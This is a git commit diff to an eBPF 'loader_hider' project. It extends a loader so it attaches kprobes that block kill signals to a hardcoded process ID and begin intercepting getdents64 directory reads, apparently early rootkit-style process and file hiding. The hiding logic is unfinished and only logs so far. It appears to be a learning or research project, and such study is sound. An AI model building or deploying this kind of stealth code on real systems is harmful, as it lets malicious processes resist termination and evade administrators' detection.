abd641b1ef8ac519abe4dced6c6b54a8950cf630
roddamatthew <rodda.matthew1@gmail.com>
2026-07-27 23:47:42 +0930

    adding some broken bullshit

--- 2_loader_hider/loader.c
+++ 2_loader_hider/loader.c
@@ -2,11 +2,19 @@
 #include <unistd.h>
 #include <bpf/libbpf.h>
 
+#define ARRAY_SIZE(arr) (sizeof(arr) / sizeof((arr)[0]))
+
 int main(void)
 {
+    const char *names[] = {
+        "kill_enter",
+        "enter_getdents64",
+        "exit_getdents64",
+    };
+
     struct bpf_object *obj;
     struct bpf_program *prog;
-    struct bpf_link *link;
+    struct bpf_link *links[ARRAY_SIZE(names)];
 
     obj = bpf_object__open_file("loader_hider.bpf.o", NULL);
     if (!obj) {
@@ -19,23 +27,25 @@ int main(void)
         return 1;
     }
 
-    char *func_name = "kill_enter";
-    prog = bpf_object__find_program_by_name(obj, func_name);
-    if (!prog) {
-        printf("Couldn't find %s\n", func_name);
-        return 1;
-    }
+    for (int i = 0; i < ARRAY_SIZE(names); i++) {
+        prog = bpf_object__find_program_by_name(obj, names[i]);
+        if (!prog) {
+            printf("Couldn't find %s\n", names[i]);
+            return 1;
+        }
 
-    link = bpf_program__attach(prog);
-    if (!link) {
-        printf("Failed to attach");
-        return 1;
+        links[i] = bpf_program__attach(prog);
+        if (!links[i]) {
+            printf("Failed to attach");
+            return 1;
+        }
     }
 
     printf("Loaded successfully... read from /sys/kernel/tracing/trace_pipe\n");
     getchar();
     
-    bpf_link__destroy(link);
+    for (int i = 0; i < ARRAY_SIZE(names); i++)
+        bpf_link__destroy(links[i]);
     bpf_object__close(obj);
     return 0;
 }
--- 2_loader_hider/loader_hider.bpf.c
+++ 2_loader_hider/loader_hider.bpf.c
@@ -23,12 +23,50 @@ int kill_enter(struct pt_regs *ctx)
     pid_t pid = (pid_t)di;
     int sig = (int)si;
 
-    bpf_printk("pid=%d sig=%d", pid, sig);
+    // bpf_printk("pid=%d sig=%d", pid, sig);
 
-    if (pid == 30749) {
+    if (pid == 7909) {
         bpf_printk("Caught call to protected PID %d", 30749);
         bpf_override_return(ctx, -ESRCH);
     }
 
+    return 0;
+}
+
+SEC("kprobe/__x64_sys_getdents64")
+int enter_getdents64(struct pt_regs *ctx)
+{
+    // Read syscall arguments
+    struct pt_regs *sys_regs = (struct pt_regs*)PT_REGS_PARM1(ctx);
+    unsigned long di, si, dx;
+    bpf_probe_read_kernel(&di, sizeof(di), &sys_regs->di);
+    bpf_probe_read_kernel(&si, sizeof(si), &sys_regs->si);
+    bpf_probe_read_kernel(&dx, sizeof(dx), &sys_regs->dx);
+
+    unsigned int fd = (unsigned int)di;
+    struct linux_dirent64 *dirent = (struct linux_dirent64 *)si;
+    unsigned int count = (unsigned int)dx;
+
+    char buf[256];
+
+    bpf_printk("fd=%u dent=%p count=%d", fd, dirent, count);
+
+    if(bpf_probe_read_user(buf, sizeof(buf), dirent)) {
+        bpf_printk("read_user_buf failed");
+        return 0;
+    };
+
+    struct linux_dirent64 *dent = (struct linux_dirent64*)buf;
+
+    bpf_printk("d_reclen=%hu", dent->d_reclen);
+    
+    return 0;
+}
+
+SEC("kretprobe/__x64_sys_getdents64")
+int exit_getdents64(struct pt_regs *ctx)
+{
+    long ret = PT_REGS_RC(ctx);
+    bpf_printk("returned %ld", ret);
     return 0;
 }
